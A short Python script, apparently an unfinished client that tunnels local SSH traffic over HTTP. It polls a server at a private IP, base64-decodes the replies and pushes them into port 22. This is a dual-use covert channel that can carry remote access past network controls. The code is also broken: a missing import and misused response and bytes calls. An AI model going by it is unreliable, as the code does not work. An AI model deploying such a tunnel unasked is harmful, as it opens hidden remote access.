import socket
import http.client
import sys
import base64
import threading
from queue import Queue
import urllib
from time import sleep

client = None
sockSshOUT = None
sockSshIN = None
ssh_query = None

SERVER = "192.168.12.108"
HOST = "localhost"
HTTP_PORT = 8000
SSH_PORT = 22


def forward():
	""" each second, a GET package is send to the server """
	global client
	global sockSshIN
	
	sockSshIN.connect((HOST,SSH_PORT))
	while True:
		client.request("GET","toto")
		reply = client.getresponse()
		if reply.reason == "OK":
			data = client.getresponse()
			pack = base64.b64decode(data)
			cmd = pack.read()
			sockSshIN.send(cmd)
		else :
			time.sleep(100)
	sockSshIN.close()
	
def reply():
	""" take reply of server and use a socket (sockSshIN) to redirect on 22 port """
	global ssh_query
	global client
	global sockSshOUT
	
	sockSshOUT.connect((HOST,SSH_PORT))

	while True:
		response = sockSshOUT.recv(576)
	



if __name__ == "__main__":

	""" FIFO stores HTTP request """
	ssh_query = Queue()
	client = http.client.HTTPConnection(SERVER,HTTP_PORT)
	sockSshOUT = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	sockSshIN = socket.socket(socket.AF_INET,socket.SOCK_STREAM)


	forw_thread = threading.Thread(None, forward, name="send-getting")
	forw_thread.start()

	re_thread = threading.Thread(None, reply, name="forward")
	re_thread.start()
